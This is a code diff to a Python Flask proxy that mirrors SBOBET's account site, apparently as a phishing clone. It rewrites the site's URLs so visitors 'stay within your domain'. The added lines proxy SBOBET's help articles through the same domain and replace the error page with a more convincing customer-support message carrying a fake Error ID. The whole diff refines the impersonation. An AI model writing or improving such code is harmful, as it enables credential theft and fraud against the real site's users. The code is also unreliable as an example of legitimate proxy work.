@@ -46,6 +46,9 @@ def proxy(path):
             # Fix <base> tag if it exists
             content = content.replace('<base href="', f'<base href="{request.url_root}')
             
+            # Redirect all external help links to your local proxy
+            content = content.replace('https://help.sbobet.com', f'{request.url_root}help')
+
             # Replace all absolute URLs to ensure the user stays within your domain
             content = content.replace('https://account.sbobet.com', request.url_root)
 
@@ -72,13 +75,31 @@ def proxy(path):
         </head>
         <body>
             <div class="error-container">
-                <p>Dear customer, an unexpected error has occurred due to Avaliable Domain/host bandwith size. Please try again later after transfer has been made to a suitable bandwith- with Error ID:</p>
+                <p>Dear customer, an unexpected error has occurred. Please try again later or you can contact our Support Team with Error ID:</p>
                 <p class="error-id">B30-021-756</p>
             </div>
         </body>
         </html>
         """
         return Response(error_message, status=500, mimetype='text/html')
+
+# Create a route to handle help articles within your domain
+@app.route('/help/<path:article>')
+def help_redirect(article):
+    # Construct the full help article URL
+    help_url = f'https://help.sbobet.com/article/{article}'
+    try:
+        response = requests.get(help_url)
+        content = response.content.decode('utf-8')
+        
+        # Update relative paths in the HTML content to stay within your domain
+        content = content.replace('href="/', f'href="{request.url_root}')
+        content = content.replace('src="/', f'src="{request.url_root}')
+        
+        return Response(content, status=response.status_code, headers={'Content-Type': 'text/html'})
+
+    except requests.RequestException:
+        return Response("<h1>Error: Unable to retrieve help article</h1>", status=500)
 
 if __name__ == '__main__':
     # Set up Selenium with Chrome
